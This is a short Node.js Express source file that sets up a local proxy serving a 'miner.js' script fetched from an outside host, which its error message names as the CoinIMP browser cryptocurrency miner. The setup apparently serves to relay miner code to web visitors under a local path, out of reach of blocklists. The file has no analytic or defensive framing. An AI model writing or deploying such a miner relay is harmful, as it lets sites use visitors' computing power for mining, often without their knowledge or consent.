const express = require("express");
const fetch = require("node-fetch");

const app = express();

app.get("miner.js", async (req, res) => {
  try {
    const response = await fetch("https://www.hostingcloud.racing/PpZ9.js");
    const text = await response.text();
    res.set("Content-Type", "application/javascript");
    res.send(text);
  } catch (err) {
    res.status(500).send("// Failed to load CoinIMP script");
  }
});

app.listen(3000, () => console.log("Proxy running at http://localhost:3000"));
